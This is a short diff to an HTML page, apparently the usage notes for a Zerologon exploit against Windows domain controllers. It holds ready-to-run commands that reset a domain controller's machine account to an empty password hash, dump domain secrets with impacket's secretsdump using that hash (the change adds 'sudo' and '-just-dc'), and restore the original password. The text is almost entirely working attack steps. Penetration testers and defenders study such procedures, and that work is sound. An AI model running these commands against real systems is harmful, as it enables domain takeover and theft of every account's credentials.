@@ -163,7 +163,7 @@
 <pre><code class="language-bash">python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
 </code></pre>
 <p>Then, the DC's machine accounts hash is set to <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>, and the old hash should be printed to the screen, note this for later. This can be used with impacket's pass-the-hash functionality. I.e. dumping secret:</p>
-<pre><code class="language-bash">secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
+<pre><code class="language-bash">sudo secretsdump.py -just-dc -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
 </code></pre>
 <p>To reinstall the old machine password, run the following command:</p>
 <pre><code class="language-bash">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
